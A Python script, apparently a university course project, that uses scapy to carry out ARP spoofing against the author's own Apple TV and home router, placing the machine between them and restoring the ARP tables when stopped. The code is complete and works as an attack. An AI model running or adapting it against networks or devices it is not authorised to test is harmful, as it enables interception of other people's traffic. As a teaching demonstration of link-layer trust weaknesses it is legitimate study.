#!/usr/bin/env python3
"""
arp spoofing demo: csci4345 network application project
target: personal apple tv (living room) on home network
purpose: educational demonstration of link layer trust vulnerabilities

note: mac addresses below are partially masked for the public repo.
real values were used during actual testing, shown in screenshots/video.
"""

from scapy.all import ARP, Ether, send
import time
import sys

# configuration section, update these values if the network changes
VICTIM_IP = "192.168.125.60"      # apple tv (living room), the device we are targeting
VICTIM_MAC = "c4:f7:c1:**:**:**"  # apple tv's real hardware address, found in tv settings
GATEWAY_IP = "192.168.125.1"      # home router's ip address
GATEWAY_MAC = "04:bc:9f:**:**:**" # router's real hardware address, found using an arp request

def get_my_mac(interface="enp0s1"):
    # grabs this vm's own mac address so we know who we are on the network
    from scapy.all import get_if_hwaddr
    return get_if_hwaddr(interface)

def spoof(target_ip, spoof_ip, target_mac):
    # builds and sends a fake arp reply
    # this tells target_ip that spoof_ip's traffic should now go to OUR mac address
    # op=2 means "arp reply" (as opposed to op=1, which is a request)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    # sends the correct, original arp mapping to undo our spoofing
    # this runs when we stop the script, so we don't leave the real devices confused
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def main():
    attacker_mac = get_my_mac()
    print(f"[*] attacker mac: {attacker_mac}")
    print(f"[*] targeting apple tv: {VICTIM_IP} ({VICTIM_MAC})")
    print(f"[*] spoofing gateway: {GATEWAY_IP} ({GATEWAY_MAC})")
    print("[*] press ctrl+c to stop and restore arp tables.\n")

    try:
        packets_sent = 0
        while True:
            # tell the apple tv that we are the router
            spoof(VICTIM_IP, GATEWAY_IP, VICTIM_MAC)
            # tell the router that we are the apple tv
            spoof(GATEWAY_IP, VICTIM_IP, GATEWAY_MAC)

            packets_sent += 2
            print(f"\r[*] packets sent: {packets_sent}", end="")
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        # this block runs when you press ctrl+c, so the network goes back to normal after the demo
        print("\n[*] restoring arp tables, please wait...")
        restore(VICTIM_IP, VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC)
        restore(GATEWAY_IP, GATEWAY_MAC, VICTIM_IP, VICTIM_MAC)
        print("[*] done. arp tables restored, exiting.")

if __name__ == "__main__":
    main()
